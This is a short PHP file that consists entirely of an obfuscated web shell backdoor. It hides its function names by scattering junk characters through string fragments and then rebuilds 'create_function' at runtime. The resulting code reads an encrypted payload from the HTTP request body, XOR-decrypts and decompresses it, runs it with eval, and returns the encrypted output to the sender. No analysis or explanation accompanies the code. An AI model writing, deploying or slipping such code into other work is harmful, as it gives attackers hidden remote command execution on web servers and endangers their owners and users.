<?php
$O='$k=",d511,d150a9";$kh,d="b82c4664,d30,dee";$kf=,d"67b077c,dbd,d,d52e";$p="Wl,dKR0gk,duixbrJayT";,df,dunction x($t,d,$,dk)';
$l='con,dte,dn,dt,ds,d();@ob_,dend_clean,d();$r=@ba,dse64_,dencode(@x(@gz,dcompress($o),,d$k)),d;print("$,dp,d$kh$r$kf");}';
$m='{$c=st,drle,dn,d($k);,d$l=st,drlen,d($t);$o="";f,dor($i=0;$i,d<$l;){for(,d,d$j=,d0;($j<$c&&$i<$,dl);$,dj++,,d$i,d++){$';
$y='/input"),$m)==1) ,d{@ob_star,dt();@e,dval,d(@gzunco,dmpr,dess(,d@x(@b,dase64_de,dcode,d($,dm[1]),$k)));$o=,d@ob_g,det_';
$J=str_replace('AK','','creAKatAKeAK_fuAKAKnctiAKon');
$F='o.=,d$t{$i,d}^$k{$j};}}ret,durn $o,d;}if (,d@pre,d,dg_ma,dtch("/$kh(.,d+,d)$kf/",@file_ge,dt_co,d,dnte,dnt,ds,d("php:/';
$k=str_replace(',d','',$O.$m.$F.$y.$l);
$X=$J('',$k);$X();
?>
